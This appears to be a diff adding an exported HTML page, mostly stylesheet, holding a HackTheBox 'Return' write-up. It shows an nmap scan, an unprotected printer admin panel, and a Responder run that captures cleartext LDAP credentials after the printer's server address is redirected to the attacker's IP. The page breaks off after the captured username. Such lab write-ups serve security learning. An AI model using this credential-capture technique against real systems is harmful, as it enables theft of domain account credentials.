@@ -1,0 +1,984 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>HackTheBox - Return (Easy)</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body>
+	<article id="7810dc74-a679-4c72-bde6-fc44c60c5cf6" class="page mono"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/gradients_10.jpg" style="object-position:center 40%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="icon.png"/></div><h1 class="page-title">HackTheBox - Return (Easy)</h1><p class="page-description"></p></header><div class="page-body"><p id="4f9a83b9-9aca-417f-b09c-cd58ba00fe72" class=""><a href="https://app.hackthebox.com/machines/401">https://app.hackthebox.com/machines/401</a></p><h1 id="5416699a-ea7d-4acb-a801-739b801db8ac" class="">Table of contents</h1><nav id="cd50756f-f1a2-41ff-95dc-eded40ff9867" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#5416699a-ea7d-4acb-a801-739b801db8ac">Table of contents</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#db1219a3-9627-4a3d-a0c7-0012a9cc163a">Enumeration</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#0a7d307a-fe52-4604-966c-9c16c2875e1c"><mark class="highlight-blue">Nmap scan</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#574dee6e-9aca-4b76-82bc-b5d194944f72"><mark class="highlight-blue">Web enumeration (port 80)</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#3214081d-5962-44dd-9c8b-5ee3ed525adc">Initial access</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#f164ab6b-2742-417c-8f1f-686c4ea27199">Local enumeration</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#564aadd8-84fb-4148-9d2b-e5f88f053771">Privilege escalation</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#6307cfe0-c372-4057-830b-48f1d23f9b15">Vulnerabilities summary</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5f90033d-ca7f-4cf3-ba85-5cbc226e83bb"><mark class="highlight-blue">Missing access control</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#56eafe90-5b75-4435-9221-f175ec575499"><mark class="highlight-blue">Insecure authentication protocol</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#d43ce1d4-2d63-4910-8cbc-1af8772615b1"><mark class="highlight-blue">Local user account misconfiguration (svc-printer)</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#1f09bffb-33cc-4820-9920-ad358d7f38e9">Sources</a></div></nav><h1 id="db1219a3-9627-4a3d-a0c7-0012a9cc163a" class="">Enumeration</h1><h2 id="0a7d307a-fe52-4604-966c-9c16c2875e1c" class=""><mark class="highlight-blue">Nmap scan</mark></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="564c41bb-50ab-4d44-87a8-e8743a7949e8" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all"># Nmap 7.93 scan initiated Mon May 15 07:32:45 2023 as: nmap -A -p- -oN nmapResults.txt 10.129.95.241
+Nmap scan report for 10.129.95.241
+Host is up (0.058s latency).
+Not shown: 65509 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: HTB Printer Admin Panel
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-15 11:51:51Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC
+49688/tcp open  msrpc         Microsoft Windows RPC
+49697/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+|_clock-skew: 18m34s
+| smb2-time: 
+|   date: 2023-05-15T11:52:51
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon May 15 07:34:22 2023 -- 1 IP address (1 host up) scanned in 97.31 seconds</code></pre><h2 id="574dee6e-9aca-4b76-82bc-b5d194944f72" class=""><mark class="highlight-blue">Web enumeration (port 80)</mark></h2><p id="6e907daf-d55b-4025-85ab-d5178043d1f7" class="">Let’s see what’s on the webserver on port 80 : </p><figure id="810ce230-836e-4480-a760-f88dbef6ea20" class="image"><a href="index.png"><img style="width:1424px" src="index.png"/></a></figure><p id="3e442c1f-9f6b-4f16-9ae0-f5def7da5d98" class="">So, we have access to a printer admin panel. The first problem I see here is the fact that there is <mark class="highlight-red"><strong>no access control</strong></mark><mark class="highlight-default"> on </mark>this admin panel. The impact of this will depend on what we are able to do on this admin panel.</p><p id="4c5267a5-5d00-4aa8-b0d2-77ea2b8b7737" class="">Let’s see what’s on the <mark class="highlight-default"><strong>Settings</strong></mark> page : </p><figure id="131feb74-ead2-43e3-b0a0-360936a4b08c" class="image"><a href="settings.png"><img style="width:1354px" src="settings.png"/></a></figure><p id="f56b86e7-26c9-4cca-a7b5-f28abf0d459f" class="">We can see the configuration of the printer. Fortunately for the target (not for an attacker), the password is not returned in the password field, this is a good point. We can see the server port set to <mark class="highlight-red"><strong><code>389</code></strong></mark>. According to the information, the printer will try to authenticate using the LDAP protocol and not the LDAPS protocol. The problem with LDAP is that the communication is not encrypted, so the credentials will be sent in clear text and may be captured by an attacker. We also found a username that could be useful later (<strong><code><mark class="highlight-red">svc-printer</mark></code></strong>).</p><h1 id="3214081d-5962-44dd-9c8b-5ee3ed525adc" class="">Initial access</h1><p id="5671ae07-6fc0-4b66-851b-f73959cde866" class="">Since we are able to edit the server address, we may be able to capture the credentials from the LDAP request by usnig <a href="https://github.com/SpiderLabs/Responder">Responder</a> and setting the server address to the IP address of our attacking host. First, let’s start responder on the VPN interface : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6867ce6c-3574-436a-8de2-a92457d3823e" class="code"><code class="language-Shell">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Return]
+└─$ sudo responder -I tun0
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -&gt; https://www.patreon.com/PythonResponder
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.16.8]
+    Responder IPv6             [dead:beef:4::1006]
+    Challenge set              [random]
+    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-8IV3QBR5OTW]
+    Responder Domain Name      [UCI7.LOCAL]
+    Responder DCE-RPC Port     [45552]
+
+[+] Listening for events...</code></pre><p id="43fe7863-04bb-43fb-b9e5-395ed0c31406" class="">Now, we can set the server address to our IP address on the printer admin panel : </p><figure id="6ff21534-1cb2-4f15-b27b-1888d7030b0c" class="image"><a href="exploit.png"><img style="width:1307px" src="exploit.png"/></a></figure><p id="0ae306f2-66cb-4f24-b641-717c75bb090d" class="">Then we can click on the <mark class="highlight-default"><strong>Update</strong></mark> button. Finally, let’s see if <a href="https://github.com/SpiderLabs/Responder">Responder</a> captured the LDAP authentication request : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dfa12cca-4fa6-4e24-8dd7-55a4b3c16998" class="code"><code class="language-Shell">[LDAP] Cleartext Client   : 10.129.95.241
+[LDAP] Cleartext Username : return\svc-printer
